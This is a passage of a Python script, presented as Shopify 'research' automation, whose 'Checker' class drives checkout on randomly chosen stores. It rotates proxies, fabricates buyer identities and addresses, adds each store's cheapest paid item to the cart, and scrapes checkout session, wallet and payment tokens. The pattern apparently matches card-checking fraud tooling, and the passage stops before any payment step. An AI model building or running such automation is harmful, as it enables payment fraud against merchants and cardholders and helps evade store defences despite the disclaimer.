

# ------------------------------------------------------------
# Shopify Workflow Automation (Research Project)
# Author: Wajd Dev
# GitHub: https://github.com/its-wajd
#
# This code is provided for educational and research purposes only.
# Unauthorized or illegal use is strictly prohibited.
# ------------------------------------------------------------


import json
import re
from typing import Dict, Any, List, Optional
import rrequests as requests
import os
import random
from datetime import datetime
from urllib.parse import urlparse
from fake_useragent import UserAgent
from urllib.parse import urlparse, parse_qs
from urllib.parse import urljoin, urlparse
import html
import time
from decimal import Decimal
import warnings
import threading
import queue
from typing import Iterable, Union
import json
import random
from bs4 import BeautifulSoup
import re
from typing import Dict, Any, Optional
from urllib.parse import urlparse, urljoin
import os
import re
import json
import random
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urljoin
import random
import re
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, urljoin
import string
######################Step1 Load The proxys###########################
def load_proxies(file_path='proxy.txt'):
    proxies = []
    if not os.path.exists(file_path):
        return proxies
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line: continue

            parts = line.split(':')
            if len(parts) == 4:
                host, port, user, pw = parts
                proxies.append(f"http://{user}:{pw}@{host}:{port}")

            elif len(parts) == 2:
                host, port = parts
                proxies.append(f"http://{host}:{port}")

            elif line.startswith('http'):
                proxies.append(line)
            else:

                proxies.append(f"http://{line}")
    return proxies
def get_session_config(proxies):
    session = requests.Session()
    if proxies:
        selected_proxy = random.choice(proxies)
        session.proxies = {
            "http": selected_proxy,
            "https": selected_proxy
        }


    return session
###############################Storage########################
# Author: Wajd Dev | github.com/its-wajd
# Educational & research use only
class Storage:
    def __init__(self, user_id):
        self.user_id = str(user_id)

        self.base_dir = os.path.join("data", self.user_id)
        os.makedirs(self.base_dir, exist_ok=True)

        self.cookies_file = os.path.join(self.base_dir, "cookies.json")
        self.data_file = os.path.join(self.base_dir, "data.json")

        self.cookies = self._load(self.cookies_file)
        self.data = self._load(self.data_file)

    def clear_data_file(self):
        self.data = {}
        self._save(self.data_file, self.data)

    def _load(self, file):
        if os.path.exists(file):
            try:
                with open(file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return {}
        return {}

    def _save(self, file, data):
        with open(file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    # ---------- COOKIES ----------

    def add_cookie(self, name, value):
        self.cookies[name] = value
        self._save(self.cookies_file, self.cookies)

    def update_cookie(self, name, value):
        self.cookies[name] = value
        self._save(self.cookies_file, self.cookies)

    def set_cookies(self, cookies_dict):
        self.cookies = dict(cookies_dict or {})
        self._save(self.cookies_file, self.cookies)

    def save_site_cookies(self, site_url, cookies_dict):
        site_url = site_url.rstrip("/")
        site_data = self.get_site_data(site_url) or {}
        site_data["cookies"] = dict(cookies_dict or {})
        self.add_site_data(site_url, site_data)
        return site_data["cookies"]

    def merge_site_cookies(self, site_url, new_cookies, also_update_global=True):
        site_url = site_url.rstrip("/")

        site_data = self.get_site_data(site_url) or {}
        existing = site_data.get("cookies", {})

        if not isinstance(existing, dict):
            existing = {}

        merged = dict(existing)
        merged.update(dict(new_cookies or {}))

        site_data["cookies"] = merged
        self.add_site_data(site_url, site_data)

        if also_update_global:
            global_cookies = self.cookies if isinstance(self.cookies, dict) else {}
            global_cookies.update(dict(new_cookies or {}))
            self.set_cookies(global_cookies)

        return merged

    def get_all_site_cookies(self, site_url):
        site_url = site_url.rstrip("/")
        site_data = self.get_site_data(site_url) or {}
        cookies = site_data.get("cookies", {})
        return cookies if isinstance(cookies, dict) else {}

    def get_cookie(self, name, site_url=None):
        if site_url:
            site_cookies = self.get_all_site_cookies(site_url)
            return site_cookies.get(name)
        return self.cookies.get(name)

    def get_cookies(self):
        return self.cookies

    def get_cookies_for_requests(self, site_url=None):
        if site_url:
            return self.get_all_site_cookies(site_url)
        return self.cookies if isinstance(self.cookies, dict) else {}

    # ---------- SITE DATA ----------

    def add_site_data(self, url, data):
        old = self.data.get(url, {})
        if isinstance(old, dict) and isinstance(data, dict):
            old.update(data)
            self.data[url] = old
        else:
            self.data[url] = data
        self._save(self.data_file, self.data)

    def get_site_data(self, url):
        return self.data.get(url)

    def get_all_data(self):
        return self.data

    # ---------- GENERIC VALUES ----------

    def add_value(self, name, value):
        self.data[name] = value
        self._save(self.data_file, self.data)

    def _get_nested(self, data, path, default=None):
        if not path:
            return default

        current = data
        for key in path.split("."):
            if isinstance(current, dict) and key in current:
                current = current[key]
            else:
                return default
        return current

    def get_value(self, name, site_url=None, default=None):
        if site_url:
            site_data = self.get_site_data(site_url) or {}
            return self._get_nested(site_data, name, default)

        if name in self.data:
            return self.data[name]

        return self._get_nested(self.data, name, default)

    # ---------- ADDRESS HELPERS ----------

    def _load_states_json(self, states_json_path: str = "states.json"):
        if not os.path.exists(states_json_path):
            return []

        try:
            with open(states_json_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data
                if isinstance(data, dict):
                    return data.get("states", []) or data.get("data", []) or []
        except Exception:
            pass
        return []

    def _find_state_entry(
        self,
        country_code: Optional[str],
        state_name: Optional[str],
        states_json_path: str = "states.json"
    ):
        states = self._load_states_json(states_json_path)
        cc = (country_code or "").strip().upper()
        sn = (state_name or "").strip().lower()

        for item in states:
            item_country = str(item.get("country_code", "")).strip().upper()
            item_name = str(item.get("name", "")).strip().lower()
            item_iso2 = str(item.get("iso2", "")).strip().lower()
            item_iso3166_2 = str(item.get("iso3166_2", "")).strip().lower()

            if cc and item_country != cc:
                continue

            if sn in {item_name, item_iso2, item_iso3166_2}:
                return item

        return None

    def resolve_zone_code(
        self,
        country_code: Optional[str],
        state_name: Optional[str],
        states_json_path: str = "states.json",
        prefer: str = "name"
    ):
        item = self._find_state_entry(country_code, state_name, states_json_path)
        if not item:
            return None

        if prefer == "name":
            return item.get("name")
        if prefer == "iso2":
            return item.get("iso2")
        if prefer == "iso3166_2":
            return item.get("iso3166_2")
        return item.get("name")

    def pick_valid_postcode_via_geonames(
        self,
        country_code: str,
        zone_code: str,
        username: str = "demo"
    ):
        # simple safe implementation
        # if request fails, just return None
        try:
            url = "http://api.geonames.org/postalCodeSearchJSON"
            params = {
                "country": country_code,
                "adminCode1": zone_code,
                "maxRows": 10,
                "username": username,
            }
            r = requests.get(url, params=params, timeout=15)
            r.raise_for_status()
            data = r.json()

            codes = data.get("postalCodes", [])
            if not codes:
                return None

            chosen = random.choice(codes)
            return str(chosen.get("postalCode") or "").strip() or None
        except Exception:
            return None

    def _fetch_randomuser_address(
        self,
        nat: Optional[str] = None,
        timeout: int = 15,
        states_json_path: str = "states.json",
        geonames_username: str = "demo"
    ) -> Dict[str, Any]:
        url = "https://randomuser.me/api/"
        params = {}
        if nat:
            params["nat"] = nat.lower()

        r = requests.get(url, params=params, timeout=timeout)
        r.raise_for_status()

        data = r.json()
        results = data.get("results", [])
        if not results:
            raise RuntimeError("No results returned from randomuser")

        user = results[0]
        name = user.get("name", {})
        loc = user.get("location", {})
        street = loc.get("street", {})

        address = {
            "title": name.get("title"),
            "first_name": name.get("first"),
            "last_name": name.get("last"),
            "full_name": f"{name.get('first', '')} {name.get('last', '')}".strip(),
            "email": user.get("email"),
            "phone": user.get("phone"),
            "cell": user.get("cell"),
            "country_code": (nat or "").upper() or None,
            "street_number": str(street.get("number") or ""),
            "street_name": street.get("name"),
            "city": loc.get("city"),
            "state": loc.get("state"),
            "country": loc.get("country"),
            "postcode": str(loc.get("postcode") or ""),
            "source": "randomuser",
            "raw_api_data": data,
        }

        return address

    def _generate_local_fallback(
        self,
        states_json_path: str = "states.json",
        geonames_username: str = "demo"
    ) -> Dict[str, Any]:
        first_names = ["James", "John", "Robert", "Michael", "David"]
        last_names = ["Smith", "Johnson", "Brown", "Taylor", "Anderson"]
        streets = ["Main St", "Oak Ave", "Pine Rd", "Maple Dr", "Cedar Ln"]

        states = self._load_states_json(states_json_path)

        picked = random.choice(states) if states else {}
        country_code = str(picked.get("country_code") or "US").upper()
        state_name = picked.get("name") or "New York"
        country = picked.get("country_name") or country_code

        zone_code = picked.get("iso2") or None
        postcode = None
        if zone_code:
            postcode = self.pick_valid_postcode_via_geonames(
                country_code=country_code,
                zone_code=zone_code,
                username=geonames_username
            )

        first = random.choice(first_names)
        last = random.choice(last_names)
        street_number = str(random.randint(100, 9999))
        street_name = random.choice(streets)

        return {
            "title": None,
            "first_name": first,
            "last_name": last,
            "full_name": f"{first} {last}",
            "email": None,
            "phone": None,
            "cell": None,
            "country_code": country_code,
            "street_number": street_number,
            "street_name": street_name,
            "city": None,
            "state": state_name,
            "country": country,
            "postcode": postcode or "",
            "source": "fallback",
            "raw_api_data": None,
        }

    # ---------- ADDRESS ----------

    def save_generated_address(
        self,
        address: Dict[str, Any],
        key: str = "address"
    ) -> Dict[str, Any]:
        self.data[key] = address
        self._save(self.data_file, self.data)
        return address

    def generate_and_save_address(
        self,
        nat: Optional[str] = None,
        key: str = "address",
        states_json_path: str = "states.json",
        geonames_username: str = "demo"
    ) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "success": False,
            "address": None,
            "raw": {},
            "errors": [],
            "saved_at_utc": datetime.utcnow().isoformat() + "Z",
        }

        address = None

        try:
            address = self._fetch_randomuser_address(
                nat=nat,
                timeout=15,
                states_json_path=states_json_path,
                geonames_username=geonames_username
            )
            result["raw"]["randomuser_processed"] = dict(address or {})
        except Exception as e:
            result["errors"].append(f"randomuser_failed: {str(e)}")

        if not address:
            try:
                address = self._generate_local_fallback(
                    states_json_path=states_json_path,
                    geonames_username=geonames_username
                )
                result["raw"]["fallback_processed"] = dict(address or {})
            except Exception as e:
                result["errors"].append(f"fallback_failed: {str(e)}")
                raise RuntimeError(
                    "Failed to generate address from both randomuser and fallback"
                ) from e

        country_code = (address.get("country_code") or "").upper().strip() or None
        state_name = (address.get("state") or "").strip() or None

        try:
            zone_name = self.resolve_zone_code(
                country_code=country_code,
                state_name=state_name,
                states_json_path=states_json_path,
                prefer="name"
            )
        except Exception:
            zone_name = None

        try:
            zone_code = self.resolve_zone_code(
                country_code=country_code,
                state_name=state_name,
                states_json_path=states_json_path,
                prefer="iso2"
            )
        except Exception:
            zone_code = None

        try:
            zone_code_full = self.resolve_zone_code(
                country_code=country_code,
                state_name=state_name,
                states_json_path=states_json_path,
                prefer="iso3166_2"
            )
        except Exception:
            zone_code_full = None

        if zone_name:
            address["zone_name"] = zone_name
        if zone_code:
            address["zone_admin_code"] = zone_code
        if zone_code_full:
            address["zone_code_full"] = zone_code_full

        try:
            if country_code and zone_code:
                valid_postcode = self.pick_valid_postcode_via_geonames(
                    country_code,
                    zone_code,
                    username=geonames_username
                )
                if valid_postcode:
                    address["postcode"] = str(valid_postcode)
                    address["postcode_source"] = "geonames"
        except Exception as e:
            result["errors"].append(f"postcode_fix_failed: {str(e)}")

        street_number = address.get("street_number") or ""
        street_name = address.get("street_name") or ""
        city = address.get("city") or ""
        state = address.get("state") or ""
        postcode = address.get("postcode") or ""
        country = address.get("country") or ""

        address["full_address"] = ", ".join(
            [
                x for x in [
                    f"{street_number} {street_name}".strip(),
                    city,
                    state,
                    postcode,
                    country
                ] if x
            ]
        )

        address["saved_by_storage"] = True
        address["saved_at_utc"] = datetime.utcnow().isoformat() + "Z"

        result["success"] = True
        result["address"] = address

        self.data[key] = result
        self._save(self.data_file, self.data)

        return result
##############################Checkout Page ####################
class Checker:
    def __init__(self, user_id, sites_file="sites.json", storage=None):
        self.user_id = str(user_id)
        self.sites_file = sites_file
        self.session = requests.Session()
        self.storage = storage
        self.storage.clear_data_file()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/146.0.0.0 Safari/537.36"
            ),
            "Accept": "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        })

    # -------------------- basic helpers --------------------

    def load_sites(self):
        with open(self.sites_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, list) or not data:
            raise ValueError("sites.json must contain a non-empty list")
        return data

    def get_random_site(self):
        return random.choice(self.load_sites())

    def normalize_base_url(self, url: str) -> str:
        parsed = urlparse(url.strip())
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path
        if not netloc:
            raise ValueError(f"Invalid URL: {url}")
        return f"{scheme}://{netloc}"

    def _safe_json(self, response):
        try:
            return response.json()
        except Exception:
            return None

    def merge_cookie_dicts(self, *cookie_sets) -> dict:
        merged = {}
        for cookie_set in cookie_sets:
            if isinstance(cookie_set, dict):
                merged.update(cookie_set)
        return merged

    def response_cookies_dict(self, response) -> dict:
        try:
            return requests.utils.dict_from_cookiejar(response.cookies)
        except Exception:
            return {}

    def session_cookies_dict(self) -> dict:
        try:
            return requests.utils.dict_from_cookiejar(self.session.cookies)
        except Exception:
            return {}

    def get_history_cookies(self, site_url: str) -> dict:
        if not self.storage:
            return {}
        return self.storage.get_all_site_cookies(site_url)

    def apply_history_cookies_to_session(self, site_url: str):
        history_cookies = self.get_history_cookies(site_url)
        if history_cookies:
            self.session.cookies.update(history_cookies)
        return history_cookies

    def sync_cookies_from_response(self, site_url: str, response) -> dict:
        """
        Merge all cookies:
        - old history cookies from data.json
        - response cookies
        - current session cookies
        Save final result into data.json
        """
        old_cookies = self.get_history_cookies(site_url)
        response_cookies = self.response_cookies_dict(response)
        session_cookies = self.session_cookies_dict()

        merged = self.merge_cookie_dicts(old_cookies, response_cookies, session_cookies)

        if self.storage:
            self.storage.save_site_cookies(site_url, merged)

        return merged

    # -------------------- collections --------------------

    def save_cookies(self, base_url):
        cookies = self.session_cookies_dict()
        all_old = self.get_history_cookies(base_url)
        merged = self.merge_cookie_dicts(all_old, cookies)

        if self.storage:
            self.storage.save_site_cookies(base_url, merged)

        return merged

    def extract_collection_urls(self, html: str, base_url: str):
        found = set()
        hrefs = re.findall(r'''href=["']([^"'#]+)["']''', html, re.IGNORECASE)

        for href in hrefs:
            full_url = urljoin(base_url, href)
            parsed = urlparse(full_url)
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip("/")

            if re.match(r"^https?://[^/]+/collections/[^/?#]+$", clean_url, re.IGNORECASE):
                found.add(clean_url)

        return sorted(found)

    def get_collections(self, site_url: Optional[str] = None):
        random_site = site_url or self.get_random_site()
        base_url = self.normalize_base_url(random_site)
        collections_url = base_url.rstrip("/") + "/collections/"

        self.apply_history_cookies_to_session(base_url)

        response = self.session.get(collections_url, timeout=20)
        html = response.text

        cookies = self.sync_cookies_from_response(base_url, response)
        collection_urls = self.extract_collection_urls(html, base_url)

        if self.storage:
            old = self.storage.get_site_data(base_url) or {}
            old.update({
                "cookies": cookies,
                "collections_page": collections_url,
                "collections_found": collection_urls,
                "status_code": response.status_code
            })
            self.storage.add_site_data(base_url, old)

        return {
            "base_url": base_url,
            "collections_url": collections_url,
            "cookies": cookies,
            "status_code": response.status_code,
            "collection_urls": collection_urls,
            "html": html
        }

    # -------------------- product discovery --------------------

    def get_collection_products(self, domain: str, handle: str) -> List[Dict[str, Any]]:
        domain = domain.rstrip("/")
        products = []
        page = 1
        limit = 250

        while True:
            url = f"{domain}/collections/{handle}/products.json"
            params = {"limit": limit, "page": page}

            r = self.session.get(url, params=params, timeout=20)
            if r.status_code != 200:
                break

            data = self._safe_json(r)
            if not isinstance(data, dict):
                break

            batch = data.get("products", [])
            if not isinstance(batch, list) or not batch:
                break

            products.extend(batch)

            if len(batch) < limit:
                break

            page += 1

        return products

    def get_all_products(self, domain: str) -> List[Dict[str, Any]]:
        domain = domain.rstrip("/")
        products = []
        page = 1
        limit = 250

        while True:
            url = f"{domain}/products.json"
            params = {"limit": limit, "page": page}

            r = self.session.get(url, params=params, timeout=20)
            if r.status_code != 200:
                break

            data = self._safe_json(r)
            if not isinstance(data, dict):
                break

            batch = data.get("products", [])
            if not isinstance(batch, list) or not batch:
                break

            products.extend(batch)

            if len(batch) < limit:
                break

            page += 1

        return products

    @staticmethod
    def cheapest_variant(product):
        variants = product.get("variants") or []
        best = None

        for variant in variants:
            raw_price = variant.get("price")
            try:
                price = float(raw_price)
            except Exception:
                continue

            available = variant.get("available", True)
            if not available:
                continue

            if best is None or price < best[0]:
                best = (price, variant)

        return best

    def find_cheapest_product(self, domain: str, collection_urls):
        domain = domain.rstrip("/")
        cheapest_product = None
        best_by_product = {}

        for collection_url in collection_urls:
            handle = collection_url.split("/collections/")[-1].strip()
            if not handle:
                continue

            try:
                products = self.get_collection_products(domain, handle)
            except Exception as e:
                print(f"Failed collection {collection_url}: {e}")
                continue

            for product in products:
                try:
                    product_id = int(product.get("id"))
                except Exception:
                    continue

                best = self.cheapest_variant(product)
                if not best:
                    continue

                price, variant = best

                # skip free / invalid / zero-priced products
                try:
                    price = float(price)
                except Exception:
                    continue
                if price <= 0:
                    continue

                product_handle = product.get("handle")
                product_url = (
                    f"{domain}/products/{product_handle}"
                    if isinstance(product_handle, str) and product_handle else None
                )

                row = {
                    "name": product.get("title") or product_handle or str(product_id),
                    "product_id": product_id,
                    "variant_id": variant.get("id"),
                    "price": price,
                    "product_url": product_url,
                    "collection_url": collection_url,
                }

                old = best_by_product.get(product_id)
                if old is None or row["price"] < old["price"]:
                    best_by_product[product_id] = row

        if best_by_product:
            all_items = list(best_by_product.values())
            all_items.sort(key=lambda x: x["price"])
            cheapest_product = all_items[0]

        if cheapest_product is None:
            try:
                all_products = self.get_all_products(domain)
                print(f"Fallback /products.json -> {len(all_products)} products")
            except Exception as e:
                print(f"Fallback all products failed: {e}")
                all_products = []

            for product in all_products:
                try:
                    product_id = int(product.get("id"))
                except Exception:
                    continue

                best = self.cheapest_variant(product)
                if not best:
                    continue

                price, variant = best

                # skip free / invalid / zero-priced products
                try:
                    price = float(price)
                except Exception:
                    continue
                if price <= 0:
                    continue

                product_handle = product.get("handle")
                product_url = (
                    f"{domain}/products/{product_handle}"
                    if isinstance(product_handle, str) and product_handle else None
                )

                row = {
                    "name": product.get("title") or product_handle or str(product_id),
                    "product_id": product_id,
                    "variant_id": variant.get("id"),
                    "price": price,
                    "product_url": product_url,
                    "collection_url": f"{domain}/collections/",
                }

                if cheapest_product is None or row["price"] < cheapest_product["price"]:
                    cheapest_product = row

        return cheapest_product
    # -------------------- cart --------------------

    def get_cart(self, site_url: str):
        """
        Same idea as your cart(url) logic:
        - use all cookies from history
        - call /cart.js
        - save token in data.json
        - merge and save cookies back to data.json
        """
        site_url = self.normalize_base_url(site_url)

        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7",
            "content-type": "application/json;",
            "priority": "u=1, i",
            "referer": f"{site_url}/collections/digital-downloads?filter.v.price.gte=&filter.v.price.lte=1&sort_by=manual",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.session.headers.get("User-Agent", "Mozilla/5.0"),
            "x-requested-with": "XMLHttpRequest",
        }

        cookies = self.get_history_cookies(site_url)
        if cookies:
            self.session.cookies.update(cookies)

        response = self.session.get(
            f"{site_url}/cart.js",
            cookies=cookies,
            headers=headers,
            timeout=20
        )

        final_cookies = self.sync_cookies_from_response(site_url, response)

        if not response.ok:
            print("Cart fetch failed:", response.status_code, response.text[:300])
            return None

        data = self._safe_json(response)
        if not isinstance(data, dict):
            print("Invalid cart JSON")
            return None

        token = data.get("token")

        if self.storage:
            old = self.storage.get_site_data(site_url) or {}
            old["cookies"] = final_cookies
            old["cart_token"] = token
            old["cart"] = data
            self.storage.add_site_data(site_url, old)

        return data

    def add_cart(self, site_url: str):
        site_url = self.normalize_base_url(site_url)

        cheapest_product = None
        if self.storage:
            cheapest_product = self.storage.get_value("cheapest_product", site_url=site_url)

        if not cheapest_product:
            print("No cheapest product found in storage")
            return None

        product_id = cheapest_product.get("product_id")
        variant_id = cheapest_product.get("variant_id")

        if not product_id or not variant_id:
            print("Missing product_id or variant_id")
            return None

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "user-agent": self.session.headers.get("User-Agent", "Mozilla/5.0"),
            "x-requested-with": "XMLHttpRequest",
            "origin": site_url,
            "referer": cheapest_product.get("product_url") or site_url,
        }

        data = {
            "form_type": "product",
            "utf8": "✓",
            "id": str(variant_id),
            "product-id": str(product_id),
            "quantity": "1",
        }

        cookies = self.get_history_cookies(site_url)
        if cookies:
            self.session.cookies.update(cookies)

        response = self.session.post(
            f"{site_url}/cart/add.js",
            headers=headers,
            data=data,
            cookies=cookies,
            timeout=20
        )

        final_cookies = self.sync_cookies_from_response(site_url, response)

        if not response.ok:
            print("Add to cart failed:", response.status_code, response.text[:300])
            return None

        try:
            cart_item = response.json()
        except Exception:
            print("Invalid JSON response")
            return None

        cart_data = {
            "id": cart_item.get("id"),
            "variant_id": cart_item.get("variant_id"),
            "product_id": cart_item.get("product_id") or product_id,
            "price": cart_item.get("price"),
            "quantity": cart_item.get("quantity"),
            "title": cart_item.get("title"),
            "product_title": cart_item.get("product_title"),
            "handle": cart_item.get("handle"),
            "url": cart_item.get("url"),
            "sku": cart_item.get("sku"),
        }

        if self.storage:
            old = self.storage.get_site_data(site_url) or {}
            old["cookies"] = final_cookies
            old["last_cart_add"] = cart_data
            self.storage.add_site_data(site_url, old)

        return cart_item

    def resp_cookies(self, response) -> Dict[str, str]:
        """
        Extract cookies from response object as dict.
        Works even if response type is not requests.Response exactly.
        """
        cookies = {}

        try:
            if hasattr(response, "cookies") and response.cookies:
                for cookie in response.cookies:
                    cookies[cookie.name] = cookie.value
        except Exception:
            pass

        return cookies

    def money_to_float(self,s: str):
        if not s:
            return None
        s = s.replace(",", "").replace("−", "-").replace("–", "-").strip()
        m = re.search(r"-?\s*\$?\s*([0-9]+(?:\.[0-9]{1,2})?)", s)
        if not m:
            return None
        value = float(m.group(1))
        if "-" in s:
            value = -value
        return value
    def extract_checkout_tokens(self, resp) -> Optional[Dict[str, Any]]:
        """
        Try to find Shopify checkout redirect URL and extract tokenx + _r token.
        Checks final response and redirect history.
        """
        locations = []

        try:
            if hasattr(resp, "history") and resp.history:
                for h in resp.history:
                    loc = getattr(h, "headers", {}).get("Location")
                    if loc:
                        locations.append(loc)
        except Exception:
            pass

        try:
            final_loc = getattr(resp, "headers", {}).get("Location")
            if final_loc:
                locations.append(final_loc)
        except Exception:
            pass

        if not locations:
            return None

        for loc in reversed(locations):
            parsed = urlparse(loc)

            m = re.search(r"/cn/([^/]+)/", parsed.path)
            if not m:
                continue

            tokenx = m.group(1)
            q = parse_qs(parsed.query)
            r_token = q.get("_r", [None])[0]

            return {
                "redirect_location": loc,
                "tokenx": tokenx,
                "r_token": r_token,
                "checkout_base_url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
            }

        return None

    def checkout(self, site_url: str):
        base = self.normalize_base_url(site_url)

        collection_url = self.storage.get_value(
            "cheapest_product.collection_url",
            base,
            default=f"{base}/collections/all"
        )

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": base,
            "priority": "u=0, i",
            "referer": f"{collection_url}?filter.v.price.gte=&filter.v.price.lte=1&sort_by=manual",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0",
        }

        data = {
            "checkout": "",
        }

        cookies = self.storage.get_cookies_for_requests(base)
        if cookies and isinstance(cookies, dict):
            self.session.cookies.update(cookies)
        else:
            cookies = None

        try:
            response = self.session.post(
                f"{base}/cart",
                headers=headers,
                data=data,
                cookies=cookies,
                allow_redirects=True,
                timeout=30
            )
        except Exception as e:
            print(f"checkout request failed: {e}")
            return None

        response_cookies = self.resp_cookies(response)
        merged = self.storage.merge_site_cookies(base, response_cookies)

        if merged and isinstance(merged, dict):
            self.session.cookies.update(merged)

        result = self.extract_checkout_tokens(response)
        if result is None:
            return None

        self.storage.add_site_data(base, {
            "r_token": result.get("r_token"),
            "tokenx": result.get("tokenx"),
            "redirect_location": result.get("redirect_location"),
            "checkout_base_url": result.get("checkout_base_url"),
        })

        return result

    # -------------------- summary/run --------------------

    def save_site_summary(self, base_url: str, collections_data: Dict[str, Any], cheapest_product: Optional[Dict[str, Any]]):
        payload = {
            "cookies": collections_data.get("cookies", {}),
            "collections_page": collections_data.get("collections_url"),
            "collections_found": collections_data.get("collection_urls", []),
            "status_code": collections_data.get("status_code"),
            "cheapest_product": cheapest_product,
        }

        if self.storage:
            self.storage.add_site_data(base_url, payload)

        return payload

    def extract(self, site_url: str):
        base = self.normalize_base_url(site_url)
        site_url = site_url.rstrip("/")

        checkout = self.storage.get_value(
            "redirect_location",
            base
        )

        collection_url = self.storage.get_value(
            "cheapest_product.collection_url",
            base,
            default=f"{base}/collections/"
        )
        r_token=self.storage.get_value(
            "r_token",
            base
        )
        tokenx=self.storage.get_value(
            "tokenx",
            base
        )
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,fr;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': f'{checkout}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            }

        params = {
            '_r': r_token,
        }

        cookies = self.get_history_cookies(site_url)
        if cookies:
            self.session.cookies.update(cookies)
        self.session.cookies.clear()

        response = self.session.get(
           f"{checkout}",
            allow_redirects=True,
            timeout=20
        )
        raw_text = response.text
        unescaped_text = html.unescape(raw_text)

        meta_schema = {
            "i": "serialized-graphql",
            "c": "serialized-sessionToken",
            "l": "serialized-encodedBuyerSessionForHeaderTransport",
            "d": "serialized-sourceToken",
            "u": "serialized-sourceType",
            "p": "serialized-shopPayConfig",
            "m": "serialized-serverHandling",
            "h": "serialized-serverRender",
            "r": "serialized-shop",
            "checkout_session_id": "serialized-checkoutSessionIdentifier"
        }

        meta_results = {}
        for var, tag in meta_schema.items():
            pattern = f'name="{tag}"\s+content="&quot;([^&]+)&quot;"'
            match = re.search(pattern, raw_text)
            meta_results[var] = match.group(1) if match else None

        token_patterns = {
            "stable_id": r'(?:&quot;|")stableId(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)(?:&quot;|")',
            "callback_token": r'(?:&quot;|")callback_token(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)(?:&quot;|")',
            "client_token": r'(?:&quot;|")clientToken(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)(?:&quot;|")',
            "wallet_token": r'(?:&quot;|")walletAuthenticationToken(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)(?:&quot;|")',
            "queue_token": r'(?:&quot;|")queueToken(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)(?:&quot;|")',
            "payment_method_identifier": r'(?:&quot;|")paymentMethodIdentifier(?:&quot;|")\s*:\s*(?:&quot;|")([^&"]+)',
        }

        tokens = {name: (re.search(pat, unescaped_text).group(1) if re.search(pat, unescaped_text) else None)
                  for name, pat in token_patterns.items()}

        env_match = re.search(r'name="serialized-environment"\s+content="([^"]+)"', raw_text)
        commit_sha_match = re.search(
            r'name="serialized-environment"\s+content="[^"]*?&quot;commitSha&quot;:&quot;([^&"]+)',
            raw_text
        )

        commit_sha = commit_sha_match.group(1) if commit_sha_match else "cd9c96eebb7f1f3d71f51568f8a1c27be882a4ad"
        deploy_stage = "production"

        if env_match:
            try:
                env_json = json.loads(html.unescape(env_match.group(1)))
                commit_sha = env_json.get("commit_sha", commit_sha)
                deploy_stage = env_json.get("deployStage", deploy_stage)
            except:
                pass

        c, d, m, h, u, l = (meta_results.get(k) for k in ('c', 'd', 'm', 'h', 'u', 'l'))

        headers = {
            "X-Checkout-Web-Deploy-Stage": deploy_stage,
            "X-Checkout-Web-Build-Id": commit_sha,
            "X-Checkout-One-Session-Token": c,
            "X-Checkout-Web-Source-Id": d,
            "Shopify-Checkout-Source": f'id="{d}", type="{u}"'
        }
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")

        result = {
            "quantity": None,
            "discount_code_field_found": False,
            "subtotal": None,
            "discount_label": None,
            "discount_amount": None,
            "estimated_taxes": None,
            "currency": None,
            "total": None,
        }

        lines = [x.strip() for x in soup.get_text("\n").splitlines() if x.strip()]

        result["discount_code_field_found"] = any("discount code" in x.lower() for x in lines)

        for i, line in enumerate(lines[:-1]):
            if re.fullmatch(r"\d+", line) and re.search(r"\$[0-9]+\.[0-9]{2}", lines[i + 1]):
